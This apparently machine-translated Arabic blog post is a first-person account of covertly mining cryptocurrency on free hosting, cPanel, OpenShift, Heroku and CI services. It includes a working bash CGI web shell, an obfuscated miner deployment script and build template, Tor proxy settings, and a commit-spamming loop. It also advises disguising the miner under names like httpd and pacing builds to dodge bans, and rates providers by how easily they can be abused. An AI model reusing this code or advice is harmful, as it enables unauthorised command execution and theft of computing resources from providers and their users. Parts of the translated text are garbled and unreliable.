رئيسية<ul><li><p>تمكين / تعطيل التتبع حول كتل التعليمات البرمجية (لا نريد تتبع ثنائي مشفر b64 في متغير ..)<li><p>وظيفة بسيطة لتنسيق السجلات<li><p>علامة من شأنها تنشيط التسجيل المطول في وقت التشغيل كلما بدأ عامل التعدين.<ul><li><p>يفعل الملف<code>.debug</code> يوجد؟<ul><li><p>تمكين التسجيل المطول</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> عمليات النشر المستهدفة</a></h2><p>تم اختبار هذا الإعداد على 3 أنواع من المضيفين:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> حاويات أو أجهزة افتراضية ذاتية الاستضافة</a></h3><p>لا يحب العديد من مزودي الاستضافة التعدين نظرًا لأن موارد وحدة المعالجة المركزية تميل إلى المشاركة بين عدة مستخدمين ، ويمكن لبرامج التعدين أن تبطئ بسهولة عقدة مضيفة تؤثر على الأداء لبقية المستخدمين. يمكن أن يكون هذا صحيحًا حتى إذا كان وقت مستخدم وحدة المعالجة المركزية غير محدود ، لأن خوارزميات التجزئة يمكن أن تشبع جميع طبقات التخزين المؤقت لوحدة المعالجة المركزية إذا تمت مشاركة ذاكرة التخزين المؤقت بين جميع مراكز وحدة المعالجة المركزية.<p>نود استخدام<em> عدل</em> حصة من الموارد دون أن يتم حظرها ، فهذه حالة استخدام جيدة لبرنامج قطارة التخفي نظرًا لأنه يدرك استخدام المضيف ، مما يعني أنه<em> يجب</em> البقاء نوعًا من داخل [AUP]. لا توجد خطوات إضافية عند التعامل مع عمليات النشر المستضافة ذاتيًا ، فقط البرنامج النصي للمشغل ، ربما يضاف إلى تسلسل التمهيد أو يتم تشغيله يدويًا.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> استضافة المواقع على أساس cPanel</a></h3><p>يتم تقديم خطط الاشتراك في استضافة الويب في الغالب من خلال [cPanel]. مرة أخرى هنا نستخدم خطط اشتراك شخصية لها حدود موارد معقولة ، ومن ناحية أخرى ، فإن أي خطة مجانية لها حدود سخيفة<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . تسمح لك cPanel بتعريف معالجات لامتدادات الملفات المختلفة ، وهذا يسمح لنا بتنفيذ البرامج النصية لـ shell من خلال ملف<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> CGI</a> مع طلب http مقابل نص برمجي تم تحميله على الخادم. هذا النوع من الواجهات هو ما تبدو عليه أصداف الويب<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . قذيفة ويب بسيطة<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>من الأفضل الاعتماد فقط على الأجهزة المدمجة حيث قد لا يُسمح بإجراء عمليات إضافية في سجون الويب ، ولكن من الممكن دائمًا<code>exec</code> مما يسمح لنا باستخدام معظم أدوات سطر الأوامر. تتم كتابة معظم قذائف الويب بلغات برمجة نصية أخرى مثل python أو php حيث لا داعي للقلق بشأن التفرغ.<p>في بيئة cpanel ، من الأفضل استخدام اسم ثابت لعملية التعدين ، مثل<code>httpd</code> أو<code>php-fpm</code> لأن<code>cgi</code> يعتمد على معالجة متعددة ، لذلك تمتلئ الخوادم دائمًا بالعديد من العمليات المسماة بهذا الاسم ، على الرغم من أن المراقب الدقيق يجب أن يلاحظ<em> متعدد الخيوط</em> نمط الاستخدام الذي هو بالتأكيد غير شائع (أو ممكن) للغات مثل perl أو php أو ruby ​​أو python!<p>للعمليات أيضًا حد زمني افتراضيًا ، (ساعة واحدة ، يوم واحد ، إلخ ..) ، لذلك نستخدم فقط وظيفة cron التي تعيد تشغيل القطارة.<p>هذا يتطلب الكثير من التحرير اليدوي ، ولسوء الحظ لم تتعرض واجهة cpanel api لأتمتة هذا الأمر للمستخدمين النهائيين ، لذا فإن استضافة الويب هي هدف ثقيل وممل لقطارة عمال المناجم لدينا.<h3 id=web_environments><a class=header-anchor href=#web_environments> بيئات الويب</a></h3><p>يوجد<em> SaaS</em> الموفرين الذين لديهم محرر ويب مقترنًا بحاوية ، مثل<a href="with a free tier before getting acquired by amazon"> سحابة 9</a> ، [codeanywhere] ، [codenvy]. يعد نشر أداة القطارة هنا أمرًا سهلاً (لديك بيئة متكاملة) ، ولكن استمرار تشغيلها يمثل عبئًا ، نظرًا لأن أي محرر ويب تفاعلي ينهي جلسته بعد فترة وجيزة من إغلاق صفحة الويب ، وبالتالي يتم وضع الحاوية في وضع السكون (إلا إذا كنت دفع بالطبع).<p>يمكن أن يعني التحايل على هذا فقط أنه يتعين علينا إبقاء الجلسات مفتوحة ، فقد حققت بعض البرامج النصية باستخدام [محرك الدمى] النتيجة المرجوة ، ولكن بعد تشغيل طويل ، وتسريب للذاكرة ، وتضخم صفحات الويب الخاصة بـ SPAs هي بالتأكيد غير جذابة وليست متخفية ، لأنه من الواجهة الخلفية للمزود ، ستبدو الجلسة المفتوحة على مدار الساعة طوال أيام الأسبوع مشبوهة بالتأكيد. في الواقع ، تعد بيئات الويب أيضًا أهدافًا ثقيلة ومملة.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> خدمات تطبيقات مجانية</a></h3><p>هذا بشكل أساسي<a href="when it used to have a free tier"> فتح</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> و [heroku]. فتح ، كون kubernetes كان سهلًا إلى حد ما للنشر ، لكنه مليء بضخامة التكوين ، إليك مقتطفات:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>كان هذا هو النص المستخدم لبناء حاوية التعدين التي تتطلب نموذج yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>لكن العملية برمتها تضمنت الكثير من الخطوات!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>في الكود الزائف:<ul><li><p>إنشاء المشروع<li><p>إنشاء التطبيق بدون صورة<li><p>بناء حاوية التعدين<li><p>نشر الحاوية مع تكوين النشر (kubernetes abstraction)<li><p>بدء النشر</ul><p>ال<code>build-build</code> بدلاً من ذلك ، أنشأت البرامج النصية ملف<em> يبني</em> الحاوية التي من شأنها أن الألغام لبضع ساعات في كل مرة. تحتوي البنايات والقرون العادية على موارد منفصلة في النقل المفتوح ، لذا استغلنا كلاهما. كانت Openshift بشكل عام تجربة سيئة نظرًا لأنها تجاوزت 4 إصدارات مختلفة (ربما أكثر من ذلك ، لقد توقفت عن التتبع بعد فترة من الوقت) وكل واحد منهم يتطلب تغييرات في التكوينات ، ولم يكن لديهم مسارات ترقية وكل شيء تم تكراره بسرعة ، وكان شائعًا من أجل توقف البنيات / البودات ، وعدم جمع القمامة ... عادةً ما يتم تشغيل إعادة التشغيل اليدوي من حين لآخر ، ربما كان kubernetes مجرد عربات التي تجرها الدواب :)<p>كان تكوين Heroku أبسط قليلاً (لا يتضمن kubernetes). بصرف النظر عن بناء الحاوية ، الذي كان مشابهًا للناقل المفتوح ، كان الباقي مجرد أمرين cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>تم دفع الحاوية مباشرة بواسطة عامل الإرساء إلى سجل heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> الاحتكاك مع heroku (وهو المستوى المجاني لا يزال قائمًا حتى وقت كتابة هذا التقرير) هو أن dynos يمكن أن يعمل فقط لمدة 22 يومًا في الشهر ، لذا فقد تطلبوا بعض الإدارة اليدوية كل شهر ، ومرة ​​أخرى ثقيلة ومملة. لقد قاموا بالفعل بتنفيذ بعض موجات الحظر في البداية ، ثم قاموا بتعطيل التسجيلات من خلال TOR ، وأنا متأكد تمامًا من أنني كنت سبب ذلك.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> حاويات CI أو VMs</a></h3><p>كانت هذه هي الأهداف الأكثر تآزرًا للقطارة لدينا. هناك العديد<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> الشركات ، التي يحرق الكثير منها أموال المستثمرين وتقدم مستويات مجانية على أمل جمع بعض الحصة السوقية في أعمال البنية التحتية للتكنولوجيا.<p>تقدم كل هذه الخدمات موارد مختلفة ، ولها متطلبات تكوينات مختلفة وتعمل في بيئات مختلفة. لم أفكر أبدًا في أتمتة تسجيل الحساب لأن هذا النوع من الأشياء مخيف في البرمجة ، أحاول تجنبها طوال الوقت ، لذلك تحملت التسجيلات اليدوية لفترة من الوقت لأنني كنت أشعر بالفضول لمعرفة نوع الاستجابة لمكافحة البريد العشوائي الذي سأحصل عليه (و كيف تختلف عن البقية!). يمكنك تخمين بعض الأشياء حول إدارة الشركة من كيفية تعاملها مع البريد العشوائي:<ul><li><p>هل تؤدي موجات الحظر؟ ثم لديهم سياسات غير صارمة ، ويتم التعامل مع المشاكل يدويًا وكل حالة على حدة<li><p>هل يتطلب التحقق من الهاتف؟ لقد تعرضوا بالفعل للإساءة في الماضي<li><p>هل يستجيبون للاستخدام الكثيف للموارد؟ إنهم يعملون بميزانية محدودة<li><p>هل يطبقون قيود الحساب أو حظر الظل؟ إذا كانوا يحظرون الظل ، فإنهم يقصدون مسؤولي النظام.</ul><p>هناك أيضًا سؤال فلسفي: إذا سمحت لك إحدى الخدمات بإساءة استخدام نظامهم لفترة طويلة ، فهل يعني ذلك أن لديهم بنية تحتية متطورة قادرة على التعامل مع الحمل ، أو ببساطة تحكم ضعيف في نظامهم؟ ويجب أن تضع في اعتبارك التوازن بين إمكانية الوصول والأمان ، فالنظام الآمن للغاية يمكن أن يقلل من الاحتفاظ بالمستخدمين.<p>إليك جدول يوضح بعض الخدمات التي قمت بنشرها من أجل:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>إعدادات<th style=text-align:center>أداء<th style=text-align:center>حظر المطرقة<tr><td style=text-align:center>بتريز<td style=color:red;text-align:center>سيء<td style=color:#ff0;text-align:center>واسطة<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>ترافيس<td style=color:green;text-align:center>حسن<td style=color:#ff0;text-align:center>واسطة<td style=color:green;text-align:center>حسن<tr><td style=text-align:center>الكود<td style=color:#ff0;text-align:center>واسطة<td style=color:red;text-align:center>سيء<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>جيتلاب<td style=color:#ff0;text-align:center>واسطة<td style=color:green;text-align:center>حسن<td style=color:green;text-align:center>حسن<tr><td style=text-align:center>دائري<td style=color:red;text-align:center>سيء<td style=color:green;text-align:center>حسن<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>سيمافور<td style=color:green;text-align:center>حسن<td style=color:green;text-align:center>حسن<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>عامل ميناء<td style=color:#ff0;text-align:center>واسطة<td style=color:#ff0;text-align:center>واسطة<td style=color:green;text-align:center>حسن<tr><td style=text-align:center>رصيف<td style=color:green;text-align:center>حسن<td style=color:#ff0;text-align:center>واسطة<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>كودفرش<td style=color:red;text-align:center>سيء<td style=color:green;text-align:center>حسن<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>ويركر<td style=color:#ff0;text-align:center>واسطة<td style=color:#ff0;text-align:center>واسطة<td style=color:red;text-align:center>سيء<tr><td style=text-align:center>خطوط أنابيب أزور<td style=color:#ff0;text-align:center>واسطة<td style=color:#ff0;text-align:center>واسطة<td style=color:red;text-align:center>سيء<tr><td style=text-align:center>المستمر<td style=color:red;text-align:center>سيء<td style=color:#ff0;text-align:center>واسطة<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>صاحب<td style=color:red;text-align:center>سيء<td style=color:red;text-align:center>سيء<td style=color:red;text-align:center>سيء<tr><td style=text-align:center>طائرة بدون طيار<td style=color:red;text-align:center>سيء<td style=color:green;text-align:center>حسن<td style=color:red;text-align:center>سيء<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>سيء<td style=color:#ff0;text-align:center>واسطة<td style=color:red;text-align:center>سيء<tr><td style=text-align:center>نيفر كود<td style=color:red;text-align:center>سيء<td style=color:green;text-align:center>حسن<td style=color:#ff0;text-align:center>واسطة<tr><td style=text-align:center>زيست / فيرسل<td style=color:red;text-align:center>سيء<td style=color:green;text-align:center>حسن<td style=color:red;text-align:center>سيء</table><p>في هذا السياق ، أ<span style=color:green> حسن</span> يعني التكوين أن الأمر لم يستغرق وقتًا طويلاً لتكوين ملف<code>ci</code> مهمة لعملية التعدين (مثل جميع الخدمات التي تعتمد على لوحة معلومات الويب بدلاً من ملف نقطة المستودع كانت عملاً روتينيًا) ،<span style=color:red> سيء</span><code>ban-hammer</code> يعني أنه كان من الصعب التسجيل في الخدمة ، أو سيتم حظر الحسابات بشكل أكبر.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> بتريز</a> يتطلب إعداد مشروع ، للاستدلال على البيئة ، والبنية المستهدفة ، وعملية التنفيذ وأشياء أخرى ، فقد كان إعداد البناء يستغرق وقتًا طويلاً جدًا ، لذا فقد حصل على تصنيف سيئ في التكوين.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> المستمر</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> صاحب</a> ، يحتوي [Codefresh] أيضًا على الكثير من خطوات التكوين اليدوي غير التصريحية.<p>خدمات مثل [Azure-pipelines] ،<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> ويركر</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> صاحب</a> يطبق حظر الظل على الحسابات ، وحظر الظل سيء ، لأنه يتركك تخمن ما إذا كان هناك خطأ ما في التكوين الخاص بك أم لا. مع بعض الخدمات ، يمكنك تخمين سبب الحظر (إلى حد كبير استغرق تصميمك وقتًا طويلاً جدًا ، أو أنك بنيت مرات عديدة في فترة قصيرة) ، بالنسبة لبعض الخدمات الأخرى مثل [Azure-pipelines] أفترض أنهم طبقوا نوعًا من بصمات الأصابع إلى مستودعات المستخدم حيث كان الحظر يأتي حتى بدون أي إساءة استخدام للموارد ، كما تم تقييد azure و vercel<code>DNS</code> الوصول داخل آلات البناء العامة ، لذلك كان هذا احتكاكًا إضافيًا يجب التغلب عليه بنفق مخصص.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> طائرة بدون طيار</a> أتاح الوصول إلى معالج 16+ نواة بالكامل ولكن انتهى به الأمر بالحظر بعد بنائين<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> الكود</a> يتيح أيضًا الوصول إلى مضيفي البناء الأقوياء ولم يحظرهم بقوة مثل الطائرات بدون طيار.<p>كانت خدماتي المفضلة ليس بسبب الربحية ولكن من أجل السهولة والراحة (أيضًا مع مشاريع أخرى)<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> ترافيس</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> سيمافور</a> و<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> عامل ميناء</a> . Travis هو مثل معيار CI وهو مرن للغاية ، Semaphore هو الوحيد<code>DSL</code> ل<code>CI</code> الذي بدا ودودًا وجيدًا على الرغم من أنه بدلاً من مجرد تسلسل لا نهاية له من مربعات الاختيار المعكرونة مثل واجهات المستخدم الأخرى ، و Docker فقط من أجل البساطة في تعيين ملفات dockerfiles للبنيات.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> يبني التكوينات</a></h3><p>تم تشغيل البنيات إما من خلال وظائف cron التي تقدمها خدمات الويب أو التزامات git. لذلك كان عليك تتبع عدد قليل من رموز الوصول أو مفاتيح ssh لإدارة جميع التزامات git. كان من المهم أيضًا عدم المبالغة في ارتكاب البريد العشوائي واستخدام الوكلاء عند الضغط على مستودعات تكوين git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>باستخدام خدمات استضافة git ، كان github هو الأكثر شمولاً حول عمليات الحظر ، ولكن تم تنفيذها فقط بناءً على تقارير إساءة الاستخدام من قبل مسؤولي خدمات ci ، نفذ gitlab موجة حظر مرة واحدة ، عندما حاولت تجديد تجربة CI (بلا مبالاة). لم أتلق أبدًا حظرًا على حساب bitbucket. لفرض التزامات git ، لدينا حلقة تشغيل طويلة تعيد وضع علامات على مستودع git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>قد يكون دفع القوة بهذه الطريقة ليس شيئًا يحبه جيثب كثيرًا وقد يكون سببًا في وضع علامة على الحسابات. تستخدم وظيفة tagger المكلفة بدفع التزامات مختلفة موقع ويب (يمكنك البحث عنه بسهولة تامة) يعطي بعض الالتزامات العشوائية. لست متأكدًا من مدى فائدة ذلك ، حيث من الواضح أن محتوى الالتزامات نفسه مريب في حالتي. وقد عضني أيضًا في المؤخرة مرة واحدة ، نظرًا لأن الالتزامات التي أرجعها هذا الأمر يمكن أن تتضمن كلمات بذيئة ، فقد تم التقاط أحد التزاماتي بواسطة روبوت تويتر الذي يتتبع ارتباطات git بكلمات بذيئة! أضفت قائمة سوداء للكلمات البذيئة بعد الحادث.<p>لم أخوض حقًا في عمليات ارتكاب git المبهمة ومستودعات git المشوشة. المثال الوحيد الذي كنت أستخدم فيه مستودعًا أكثر تفصيلاً كان مع Bitrise نظرًا لأنه لا يمكنك إعداد بنية إذا لم يتعرف النظام على بيئة (مثل تطبيقات الأجهزة المحمولة) ، ولكن حتى ذلك الحين لم يكن هناك أي دوران وكان دائمًا هو نفسه المستودع ، من السهل جدًا اكتشافه.<p>بشكل عام ، إذا اضطررت إلى رسم منحنى الجرس حول الوقت الأمثل لي<em> بدون</em>الحصول على حسابات محظورة ، عبر جميع الخدمات المختبرة ، سيكون مع مركز لمدة ساعة واحدة تقريبًا ، مرة واحدة يوميًا. بالنسبة إلى أنوية وحدة المعالجة المركزية ، بصرف النظر عن الزوجين الخارجيين (مثل الطائرة بدون طيار) ، تتوقع معظم الخدمات أن تستخدم المقدار الكامل من الموارد الممنوحة لك نظرًا لأن الإنشاءات يتم تشغيلها داخل أجهزة افتراضية أو حاويات ذات موارد محدودة ... وعادة ما تكون عملية التجميع مهمة وحدة المعالجة المركزية المشبعة ، لذلك ليس لها صلة إحصائية. بشكل حدسي ، بناء واحد في اليوم هو ما سيفعله المطور العادي ، لذلك يجب أن تتوقع رفع أعلام إذا ابتعدت عن الوسط ، والضغط من أجل إساءة الاستخدام لا ينتهي أبدًا بشكل جيد.<h2 id=conclusions><a class=header-anchor href=#conclusions> الاستنتاجات</a></h2><p>هل كان يستحق؟ كانت أجزاء الشبكات مثيرة للاهتمام بالتأكيد ، ومن الواضح أن التعامل مع تسجيلات الحسابات كان الجزء الأسوأ ، فلا أحد يحب النقر فوق رسائل التأكيد التي لا نهاية لها وتكرار إجراءات واجهة المستخدم المخدرة للعقل ، بعد كل شيء. تعد كتابة برامج التشغيل الآلي للبريد العشوائي مملة أيضًا (لأنك غالبًا ما تبحث عن واجهات برمجة التطبيقات الغبية) ، ومع هذا الافتراض (وحقيقة أن هذا لم يكن شيئًا خطيرًا أبدًا) لم أفكر في ذلك مطلقًا. هل كانت مربحة؟ في ذروته كانت تصل إلى شيء مثل<code>300$</code> شهريًا ، ربما يكفي لفنزويلي ، ليس حقًا بالنسبة لي :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> مسؤول النظام الغاضب</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>على الرغم من أن هذا قد يكسر العديد من 